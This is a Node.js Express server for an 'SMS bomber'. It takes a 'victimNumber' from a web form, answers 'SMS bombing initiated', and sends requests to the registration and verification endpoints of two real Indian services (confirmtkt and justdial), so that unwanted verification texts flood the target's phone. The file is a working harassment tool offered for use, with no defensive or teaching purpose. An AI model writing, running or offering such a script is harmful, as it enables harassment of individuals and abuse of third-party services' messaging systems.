const express = require("express");
const app = express();
var http = require('http').Server(app);
const bodyParser = require('body-parser');
const axios = require('axios');
const port = process.env.PORT || 8080;

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/smsbomber.html');
});

app.post('/submit',  (req, res) => {
  const victimNumber = req.body.number;
  

 
  res.send("SMS bombing initiated");

 

 
  
  const endpoint = `https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=+91${victimNumber}`;
 
  const endpoint2=`https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=${victimNumber}`;
  // Assume 'endpoint' and 'endpoint2' are valid URL endpoints

axios.get(endpoint)
.then(response => {
  console.log('Response:', response.data);
  // Handle the response data from endpoint
})
.catch(error => {
  console.error('Error:', error);
  // Handle errors from endpoint
});

axios.get(endpoint2)
.then(response => {
  console.log('Response:', response.data);
  // Handle the response data from endpoint2
})
.catch(error => {
  console.error('Error:', error);
  // Handle errors from endpoint2
});


  

  
});

http.listen(port, () => {
  console.log(`Server running on port ${port}`);
});